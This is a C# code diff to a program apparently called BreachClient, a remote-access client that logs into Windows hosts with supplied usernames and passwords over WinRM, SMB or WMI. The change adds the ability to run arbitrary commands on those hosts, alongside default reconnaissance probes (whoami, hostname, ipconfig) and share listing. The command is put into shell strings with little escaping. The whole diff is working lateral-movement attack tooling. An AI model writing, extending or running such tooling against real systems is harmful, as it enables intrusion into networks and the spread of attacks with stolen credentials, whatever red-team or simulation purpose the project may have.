@@ -324,38 +324,49 @@ namespace BreachClient
 
         /// <summary>
         /// Authenticate to a remote host using a native Windows service.
-        /// Instruction format: "username|password|target|service"
+        /// Instruction format: "username|password|target|service[|command]"
         /// Services: winrm (winrs), smb (net use), wmi (wmic)
+        /// Optional command overrides the default probe for winrm and wmi.
         /// </summary>
         static string RunAuthenticate(string instruction)
         {
             var parts = instruction.Split('|');
             if (parts.Length < 4)
-                return "[error] Invalid authenticate instruction — expected: user|password|target|service";
+                return "[error] Invalid authenticate instruction — expected: user|password|target|service[|command]";
 
             string username = parts[0];
             string password = parts[1];
             string target   = parts[2];
             string service  = parts[3].ToLower();
+            string? command = parts.Length >= 5 ? parts[4] : null;
 
             return service switch
             {
-                "smb" => RunSmbAuth(username, password, target),
-                "wmi" => RunWmiAuth(username, password, target),
-                _     => RunWinrmAuth(username, password, target)
+                "smb" => RunSmbAuth(username, password, target, command),
+                "wmi" => RunWmiAuth(username, password, target, command),
+                _     => RunWinrmAuth(username, password, target, command)
             };
         }
 
-        /// <summary>WinRM — run a remote command via winrs and return its output.</summary>
-        static string RunWinrmAuth(string username, string password, string target)
+        /// <summary>
+        /// WinRM — run a remote command via winrs.
+        /// Defaults to whoami/hostname/ipconfig probe when no command is specified.
+        /// </summary>
+        static string RunWinrmAuth(string username, string password, string target, string? command)
         {
+            string cmd = string.IsNullOrWhiteSpace(command)
+                ? "whoami && hostname && ipconfig"
+                : command;
             return ExecuteCommand(
-                $"winrs -r:http://{target}:5985 -u:{username} -p:{password} cmd /c \"whoami && hostname && ipconfig\""
+                $"winrs -r:http://{target}:5985 -u:{username} -p:{password} cmd /c \"{cmd}\""
             );
         }
 
-        /// <summary>SMB — authenticate via IPC$ and list shares, then clean up the session.</summary>
-        static string RunSmbAuth(string username, string password, string target)
+        /// <summary>
+        /// SMB — authenticate via IPC$, list shares, then clean up.
+        /// If a command is specified, a note is returned — SMB auth does not support remote exec.
+        /// </summary>
+        static string RunSmbAuth(string username, string password, string target, string? command)
         {
             // Clean up any existing session first to avoid "multiple connections" error
             ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes 2>nul");
@@ -377,12 +388,26 @@ namespace BreachClient
             string shares = ExecuteCommand($"net view \\\\{target}");
             ExecuteCommand($"net use \\\\{target}\\IPC$ /delete /yes");
 
-            return connect.Trim() + "\n" + shares.Trim();
+            string result = connect.Trim() + "\n" + shares.Trim();
+            if (!string.IsNullOrWhiteSpace(command))
+                result += "\n[note] SMB auth does not support -c; use winrm or wmi for remote execution";
+            return result;
         }
 
-        /// <summary>WMI — list remote processes to prove authenticated access.</summary>
-        static string RunWmiAuth(string username, string password, string target)
+        /// <summary>
+        /// WMI — run a remote command via wmic process call create, or list processes as a default probe.
+        /// Note: process call create does not capture stdout; output shows PID and return value only.
+        /// </summary>
+        static string RunWmiAuth(string username, string password, string target, string? command)
         {
+            if (!string.IsNullOrWhiteSpace(command))
+            {
+                // Escape double quotes inside the command
+                string escaped = command.Replace("\"", "\\\"");
+                return ExecuteCommand(
+                    $"wmic /node:{target} /user:{username} /password:\"{password}\" process call create \"{escaped}\""
+                );
+            }
             return ExecuteCommand(
                 $"wmic /node:{target} /user:{username} /password:\"{password}\" process list brief"
             );
